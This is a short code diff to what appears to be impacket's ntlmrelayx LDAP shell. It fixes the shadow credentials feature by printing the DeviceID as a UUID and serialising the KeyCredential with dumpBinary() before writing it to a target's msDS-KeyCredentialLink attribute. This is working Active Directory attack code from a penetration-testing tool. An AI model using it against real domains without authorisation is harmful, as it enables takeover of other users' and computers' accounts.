@@ -29,6 +29,7 @@ from ldap3.protocol.microsoft import security_descriptor_control
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCESS_ALLOWED_ACE, ACE, OBJECTTYPE_GUID_MAP
 from impacket.ldap import ldaptypes
 from impacket.examples.ntlmrelayx.utils import shadow_credentials
+import uuid
 
 
 class LdapShell(cmd.Cmd):
@@ -632,10 +633,10 @@ class LdapShell(cmd.Cmd):
         key, certificate = shadow_credentials.createSelfSignedX509Certificate(subject=target_name)
         device_id = shadow_credentials.getDeviceId()
         keyCredential = shadow_credentials.KeyCredential(key, deviceId=device_id, currentTime=shadow_credentials.getTicksNow())
-        print("KeyCredential generated with DeviceID: %s" % device_id)
+        print("KeyCredential generated with DeviceID: %s" % uuid.UUID(bytes=device_id))
 
         try:
-            new_values = target['msDS-KeyCredentialLink'].raw_values + [shadow_credentials.toDNWithBinary2String(keyCredential, target.entry_dn)]
+            new_values = target['msDS-KeyCredentialLink'].raw_values + [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target.entry_dn)]
             self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             print("Shadow credentials successfully added!")
             if self.client.result['result'] == 0:
